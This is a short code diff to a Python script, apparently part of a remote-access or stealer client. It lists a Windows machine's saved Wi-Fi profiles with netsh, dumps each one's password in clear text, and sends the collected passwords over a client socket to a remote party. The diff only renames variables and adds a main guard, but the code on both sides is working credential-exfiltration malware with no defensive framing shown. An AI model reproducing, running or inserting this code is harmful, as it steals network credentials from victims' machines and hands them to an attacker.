@@ -15,12 +15,13 @@ def get_profiles():
         return netsh_output
     else:
         profiles=re.findall(': (.*)\r',netsh_output)
-        for x in profiles:
-            output= run_command('netsh wlan show profiles "{}" key=clear'.format(x))
+        for profile in profiles:
+            output= run_command('netsh wlan show profiles "{}" key=clear'.format(profile))
             #output=re.findall('(Key Content.*)\r',proc)
             if output:
-                passwd += "\n{}\n{}\n\n".format(x,output)
-        return passwd
+                password += "\n{}\n{}\n\n".format(profile,output)
+        return password
 
-resp=get_profiles()
-send(client_socket,resp)
+if __name__ == '__main__':
+    resp=get_profiles()
+    send(client_socket,resp)
